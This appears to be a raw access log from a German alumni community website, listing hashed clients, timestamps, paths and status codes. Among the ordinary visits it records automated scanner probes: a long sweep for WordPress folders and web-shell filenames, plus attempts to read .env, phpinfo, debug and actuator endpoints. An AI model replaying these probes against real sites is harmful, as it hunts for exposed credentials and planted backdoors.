5e1bb3b150d895a1263d17728a9aa1ed56f3ab5568cd2fe97bf546ae84d11888;2025-11-24 21:02:33;;/;GET;200
56c77c588edebd8d096a10d07986004a717567278f97d981552e180092154dc8;2025-11-24 21:09:53;;/aktuelles/stellenangebote;GET;200
b6f3124cafde9ded3cc1bb9399d5537476c9b7216353157d2d04d02273874637;2025-11-24 21:11:02;;/docs/img/sk2.png;GET;404
f24766118e548f4a46d9aed498bd919906a91fb124f8dfafbf7e664ebbde448d;2025-11-24 21:17:59;;/;GET;200
c1fc9c610f26cad687a91a9b78ea704ebb1cc3b7f9b98f86bd6ddc0e872d5e9f;2025-11-24 21:19:14;;/docs/img/sk2.png;GET;404
e2db25a7491627f177f3473fa15ff30a311446c9f14b89afbecb5c37d4e13a05;2025-11-24 21:32:25;;/;GET;200
52ded6d0ba1bf1e9a47ce9f476f0ef9f955a722ff4e3a2a58bb90eee7b4ad0c5;2025-11-24 21:41:13;;/?page=docs-MA1-elemfunc.md;GET;200
660bfc6be88b93748ef9d3b129d185f09bbf74f366d055be489f5ac64b3354fe;2025-11-24 21:41:16;;/?page=docs-MA1-matrix.md;GET;200
be5931cbddcadc4d03d4c047b5c61de457c479348d88b9208be9fe20a1abf728;2025-11-24 21:43:35;;/;GET;200
de8c06549aa3c51e2eab3b70963058ecc9ccc27cc0adde61d2abb5ae05e75236;2025-11-24 21:47:51;;/actuator/health;GET;404
f347938ff4a0bc72c712cd0ca5d21b857a80c3aa2e93eb119e4bdaa14ff17a08;2025-11-24 21:59:16;/;/;GET;200
f0ab9bebfa1bc43092093340ff01e4d1346b3b309e3689e6a55da0a810851d5e;2025-11-24 22:00:22;;/;GET;200
a04a6bd988f9c7f05d58e60453d907590cd3d02853605f52b39b4e8abfbac5c6;2025-11-24 22:09:20;;/version;GET;404
9275eb1415cbd8131a720c599407eae65c4516e43a2e206cee02987d926fa258;2025-11-24 22:10:12;;/;GET;200
7bd375514be8ef9c836f6c9ab7e003fc2ed6d32ad554cfa548abc8bed32a0876;2025-11-24 22:12:13;;/;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-24 22:22:38;/personen/alumni/schule/0348;/themen;GET;200
d443d894f48565f31b8185855cb137b806483104dcb2d4df7edd27c3453fbf48;2025-11-24 22:23:19;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-24 22:24:06;/personen/alumni/schule/0348;/personen/alumni/schule/4240628;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-24 22:25:30;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen/hobby/mathematik-wettbewerbe;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-24 22:25:32;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen;GET;200
592802d4d60c2eb7687cd5eccdef38bb9c633791ebeb330c9437c5603c700800;2025-11-24 22:35:07;;/;GET;200
9e03626ed817e2d5b4c5a2ed9c92df104437b8cbd2ddcacf0276e30f7b020d39;2025-11-24 22:36:52;;/;GET;200
ff4ec216969d5a9c94a1432273d4a9cdcc35b43c792c75e9f86e96786a8c9a3f;2025-11-24 22:42:59;;/;GET;200
a422fd29867c5aa4f3a2b33ff75cdc7c36989324ec36b5d6ab188354bf23de57;2025-11-24 22:44:22;;/;GET;200
80e4125d2e12240cbd83833db7088bd9487761f121a9cea67b4dbc2854f8b6db;2025-11-24 22:47:56;;/;GET;200
6d90d6d23cf668bbe5d462daef7b02ea3f3e4efecb7e53b9f4dd878a17399a4c;2025-11-24 22:50:46;;/;GET;200
db3b0759fd39a5a1de12c7b9b18083cae458d3cacacf2b26f147354b538e8c36;2025-11-24 22:54:27;;/rechtliches/nutzungsbedingungen;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-24 23:06:00;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
23d7ac546ed07b9c2091e3de28f620bf0e30dc04a53a43af21d6d09285f2ce00;2025-11-24 23:14:59;;/;GET;200
e9c8d48971960b05fd39d631c4e63624078d033627fe3c81efed5683574c461f;2025-11-24 23:16:44;;/;GET;200
d93a621ca9a8bf923b3f3b145938524cb7c49cab687b5d982e686a92cb769e57;2025-11-24 23:22:11;;/;GET;200
fbe1ab8abe6132a4249b6921b5bdc91d8deafc6e6c3451197de9f47d3ce5545a;2025-11-24 23:22:48;;/;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-24 23:25:45;/personen/alumni/schule/0348;/personen/alumni/schule/5820;GET;200
6169308c366729c35439b631bcc1c1cede7f7e4d6e6b06295988ee5dab894240;2025-11-24 23:38:39;;/;GET;200
a7c5ac26047eedd45a63102323623b1e532d7be5f738c29e2c2d7006f46e6f20;2025-11-24 23:40:32;;/themen/details/abschied-aus-moabit;GET;200
b6e36eb347527714cb4f2afa79dcc8354e2875d52267ad5fa01ae371e37ca105;2025-11-25 00:03:22;;/;GET;200
b6e36eb347527714cb4f2afa79dcc8354e2875d52267ad5fa01ae371e37ca105;2025-11-25 00:03:22;;/;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-25 00:22:30;;/gruppen/hobby/diy-projekte;GET;302
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-25 00:22:30;;/gruppen;GET;200
c90980ca215a08e6628f442e68c278412262abd0b38bdfdacd05594ec2a6bb40;2025-11-25 00:26:09;;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-25 00:29:32;/;/;PROPFIND;405
d3612bd68536b5cc0e9cc8068e247917a8c17118e19711ff7066bc306bd4407e;2025-11-25 00:32:40;;/sitemap.xml;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-25 00:36:31;/actuator/gateway/routes;/actuator/gateway/routes;GET;404
250bee8012d6b7bac15a16dc27fd7002d6b209489b1b5440f125faeb0d181a93;2025-11-25 00:38:12;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-25 01:01:00;/personen/alumni/schule/0348;/personen/alumni/schule/HB0002;GET;200
be934412f39b8fb8986a56dadcde3cda1d9101ada4cee3fa9a38c8aa8fb765f4;2025-11-25 01:14:06;;/aktuelles/stellenangebote;GET;200
47e92680b4e7c3d7eafbdf289762f306c31b5586052ac221dc6df82984cb67d3;2025-11-25 01:15:39;;/;GET;200
86540bc3b2bcdac34bde2eec7d1c7c5c23c3f92e38e0d2e6b4f0813edb0a8400;2025-11-25 01:16:28;;/sitemap.xml;GET;200
082ae6c440986c9da37dc37bdf3f7e5de58d5bee3b06960debc5298cac480aa2;2025-11-25 01:16:42;;/config.json;GET;404
91457bb3c7524ef1c886c68cc34e7f2488b7addf49e404c6acf8b7b5fd17409f;2025-11-25 01:20:30;/;/;GET;200
47e92680b4e7c3d7eafbdf289762f306c31b5586052ac221dc6df82984cb67d3;2025-11-25 01:20:48;/sitemap.xml;/sitemap.xml;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-25 01:29:43;/;/;PROPFIND;405
edee614508a3ca8cde11f47d8687bee1aac87277b5a2806de94d8906ae15161a;2025-11-25 01:41:46;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-25 01:42:04;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen/interesse/recht-und-verwaltung;GET;200
f558eb5f09f94ec55fcf61a154755e1f5c10bf6bcf1df5ceadac78b0854f3807;2025-11-25 01:50:28;;/themen/details/der-start-ins-studium;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-25 02:01:11;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen/hobby/lesen;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-25 02:01:12;/gruppen/hobby/nahen-und-textilarbeiten;/gruppen;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-25 02:14:56;/;/;GET;200
1d4b601600c46a665a6c41cfa04a06981796b55fb3ec5bff51e7990e59dc5089;2025-11-25 02:28:00;;/app_dev.php/_profiler/phpinfo;GET;404
1d4b601600c46a665a6c41cfa04a06981796b55fb3ec5bff51e7990e59dc5089;2025-11-25 02:28:00;;/?phpinfo=-1;GET;200
1d4b601600c46a665a6c41cfa04a06981796b55fb3ec5bff51e7990e59dc5089;2025-11-25 02:28:00;;/?url=.env;GET;200
6da684d88bf7ee04b7d0dace8c20402492572d32e8d270604b62d85a6fd7c0d5;2025-11-25 02:31:51;/;/;GET;200
9bb3fb21a76ae6a5cc98cddd293ec8809d319c9e3889b847ada4392f96009177;2025-11-25 02:33:38;;/;GET;200
fd8f74529150f12aacc87f4d41229d7c5dcc37d7ce6eedd506df13efe8d03f46;2025-11-25 02:40:43;;/;GET;200
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:40:55;/;/xmrlpc.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:40:56;/;/abcd.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:40:57;/;/admin.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:40:57;/;/info.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:40:57;/;/edit.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:40:58;/;/moon.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:40:59;/;/wp-content/index.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:00;/;/classwithtostring.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:00;/;/file4.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:01;/;/ioxi-o.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:02;/;/wp-good.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:02;/;/ds.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:03;/;/bolt.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:04;/;/new.php;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:06;/;/wp-includes/js/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:07;/;/wp-includes/pomo/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:09;/;/wp-includes/rest-api/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:10;/;/wp-includes/widgets/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:10;/;/wp-admin/css/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:11;/;/wp-admin/images/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:11;/;/wp-admin/maint/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:12;/;/wp-admin/meta/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:12;/;/wp-admin/network/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:13;/;/wp-admin/user/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:14;/;/wp-content/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:15;/;/wp-content/plugins/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:16;/;/wp-content/themes/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:17;/;/wp-admin/includes/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:18;/;/wp-admin/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:18;/;/wp-content/upgrade/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:20;/;/wp-content/uploads/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:23;/;/wp-includes/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:25;/;/wp-includes/css/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:26;/;/wp-includes/ID3/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:28;/;/wp-includes/IXR/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:30;/;/wp-includes/Requests/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:30;/;/wp-includes/SimplePie/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:31;/;/wp-includes/Text/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:32;/;/wp-content/mu-plugins-old/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:43;/;/wp-content/themes/classic/inc/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:44;/;/wp-content/plugins/ninja-forms/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:45;/;/wp-content/mu-plugins/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:45;/;/wp-includes/Text/Diff/Renderer/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:46;/;/wp-includes/blocks/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:48;/;/wp-includes/certificates/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:48;/;/wp-includes/customize/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:49;/;/wp-includes/fonts/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:50;/;/wp-includes/images/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:50;/;/.well-known/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:51;/;/ALFA_DATA/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:52;/;/.well-knownold/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:53;/;/uploads/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:54;/;/upload/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:55;/;/admin/uploads/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:56;/;/Admin/uploads/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:56;/;/admin/;GET;302
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:56;/;/login;GET;200
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:57;/;/images/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:57;/;/assets/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:57;/;/vendor/phpunit/phpunit/src/Util/PHP/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:58;/;/upload/image/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:58;/;/assets/images/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:41:59;/;/Public/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:01;/;/vendor/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:02;/;/local/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:03;/;/modules/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:04;/;/Site/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:05;/;/system/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:07;/;/template/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:08;/;/shop/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:09;/;/files/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:09;/;/admin/editor/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:10;/;/include/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:10;/;/Assets/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:11;/;/images/stories/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:12;/;/plugins/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:12;/;/php/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:12;/;/wp-includes/assets/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:13;/;/wp-includes/Text/Diff/Engine/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:13;/;/wp-includes/block-patterns/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:13;/;/wp-includes/Text/Diff/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:14;/;/wp-includes/block-supports/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:14;/;/wp-includes/SimplePie/Cache/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:15;/;/wp-includes/SimplePie/Content/Type/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:15;/;/wp-includes/SimplePie/Content/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:15;/;/wp-includes/rest-api/endpoints/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:16;/;/wp-includes/rest-api/fields/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:19;/;/wp-includes/Requests/Cookie/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:19;/;/wp-includes/Requests/Proxy/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:20;/;/wp-includes/Requests/Response/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:22;/;/wp-includes/Requests/Transport/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:22;/;/wp-includes/Requests/Utility/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:23;/;/wp-includes/js/codemirror/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:23;/;/wp-includes/Requests/Exception/HTTP/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:23;/;/wp-includes/js/crop/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:24;/;/wp-includes/images/crystal/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:24;/;/wp-includes/images/media/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:26;/;/wp-includes/images/smilies/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:26;/;/wp-includes/images/wlw/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:26;/;/wp-includes/rest-api/search/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:27;/;/wp-includes/Requests/Exception/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:27;/;/wp-includes/Requests/Auth/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:29;/;/wp-includes/sodium_compat/src/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:30;/;/wp-includes/sitemaps/providers/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:30;/;/wp-includes/Text/Diff/Engine/Engine/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:31;/;/wp-includes/html-api/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:31;/;/wp-includes/php-compat/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:32;/;/wp-includes/PHPMailer/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:32;/;/wp-includes/random_compat/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:33;/;/wp-includes/sitemaps/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:34;/;/wp-includes/sodium_compat/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:34;/;/wp-includes/style-engine/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:35;/;/wp-includes/theme-compat/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:36;/;/wp-admin/css/colors/ectoplasm/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:36;/;/wp-admin/css/colors/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:37;/;/admin/images/slider/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:37;/;/admin/fckeditor/editor/filemanager/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:38;/;/sites/default/files/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:38;/;/admin/controller/extension/extension/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:38;/;/modules/mod_simplefileuploadv1.3/elements/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:38;/;/components/;GET;404
e6d5cfaf23360b2638844200bcceb4946d18f35043647ec89d9b797023235bfc;2025-11-25 02:42:39;/;/admin/uploads/images/;GET;404
c59b51e8fe46fda721c0b46320a60ad90add930500539cc213bc2f8294ee755b;2025-11-25 02:53:04;;/;GET;200
e4572885706b05f4fddf01a06092981120f175c4992682b80de42c645cd3657c;2025-11-25 02:54:38;;/sitemap.xml;GET;200
6604894891341a817bba4f83a2a03a7a2392aa82f03ef75dac1ace58cd1dcdf0;2025-11-25 02:55:43;/;/;GET;200
4dfdfc357d4c025fd1b2920b3dcf85ae8f7b73c5b898fbb29580ae03c06bf66c;2025-11-25 03:09:18;/;/;GET;200
656a1dbedd097264b29d4c0389272bac3db8ad66ee45691db156e48758e7274b;2025-11-25 03:20:32;;/;GET;200
4e81e9dc68a82e2b4cbe181222dc8c53a743929279a86562e2e32896dbab7c01;2025-11-25 03:22:43;;/rechtliches/nutzungsbedingungen;GET;200
8ac20f22ae87d70d0edc30a67bdf7a817716709356a43b6198a6c30bb75ec3f9;2025-11-25 03:24:38;;/personen/alumni/schule/59000;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-25 03:46:55;/;/;PROPFIND;405
4ad3b9584367970d98025475e19262b77f2a4f210d19e1ea99b77d418541e59a;2025-11-25 04:02:10;/;/;GET;200
e887c35cb3a93bc576d119b8ab127ee19c49e6e47e6f8730ef9bae8947de817e;2025-11-25 04:06:02;;/;GET;200
6a597af15cac5754dd91a1c32477527d9f6b93d276cea5a899ddcc934e374c96;2025-11-25 04:06:30;;/;GET;200
d0102a20aceaf41e13bcbca046745fa99ee103f7b93a8904e221bba4a0206d24;2025-11-25 04:07:33;;/gruppen;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-25 04:09:18;;/rechtliches/impressum;GET;200
e796d039602ba67a09a5adc86b4c3d18601b91518f1f4249c63e8bbabce85319;2025-11-25 04:15:36;;/;GET;200
d8a115880ec4f11b1b43c956a3a57c24ad4e112e5d1f6d6fe151f515f8544eec;2025-11-25 04:17:51;;/;GET;200
8053768d98a4e7f8f16a0e3ee00c9e0efcb9370641c9d8505dddaf97c7a7cea8;2025-11-25 04:19:53;;/;GET;200
05ec565ef2bc8430670c3542419611717efcbcb9764e3ca38eae9fa9adeb6819;2025-11-25 04:21:20;;/;GET;200
f5891b8328c6adb3bb3c4318598e51527687bbd4826c9d99370cd7262216d394;2025-11-25 04:24:34;;/;GET;200
a176c93321a22e717da79e6ee7c955ac600d523c1efe3cd85a88048318024df5;2025-11-25 04:31:52;;/;GET;200
86e36026d534d7d55aa71326f1e6cf1d66374546e1be7de78e9751ff71985973;2025-11-25 04:34:30;/;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-25 04:40:00;/;/;PROPFIND;405
4d5353815b37268c5b44cfa80e814a81d49b93cd18155f29be362b33eaba445c;2025-11-25 04:41:01;;/sitemap.xml;GET;200
95d0c782850e9d73d64dea979c20ea57217fdcc0e1c824489c81591a23a31c3c;2025-11-25 04:41:22;;/htmx/get;GET;405
c5e775ee7693a62d3fd7c1daf9a8c9192aa5ceee061faae5916d9e4468b158a9;2025-11-25 04:42:02;;/6627437333;GET;404
